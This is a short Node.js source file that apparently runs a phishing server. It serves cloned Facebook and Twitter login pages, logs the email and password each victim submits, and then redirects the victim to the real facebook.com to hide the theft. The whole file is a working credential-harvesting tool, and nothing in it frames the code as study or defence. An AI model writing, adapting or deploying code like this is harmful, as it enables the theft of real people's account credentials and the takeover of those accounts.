const http = require('http');
const fs = require('fs');
const qs = require('querystring');


let facebook = fs.readFileSync('facebook/facebook.html');
let twitter = fs.readFileSync('twitter/twitter.html');
let server = http.createServer((req, res) => {
    if(req.method === "GET"){
        if (req.url === "/facebook"){
    res.write(facebook);
    res.end();
    }else if (req.url === "/twitter"){
        res.write(twitter);
        res.end();
    }
    } else if (req.method === "POST"){
        let body = '';
        let email = '';
        let password = '';


        req.on('data', (data) => {
            body += data;
            console.log(body);

        });

        req.on('end', () => {
            body = qs.parse(body);
            email = body.email;
            password = body.password;
            console.log("ypiur email is: "+email);
            console.log("your password is: "+password);


            res.statusCode = 302;
            res.setHeader('location', 'https://facebook.com');
            res.end();
        });
    
    
    };

});

server.listen(4000, () => {
    console.log("server started!");
});
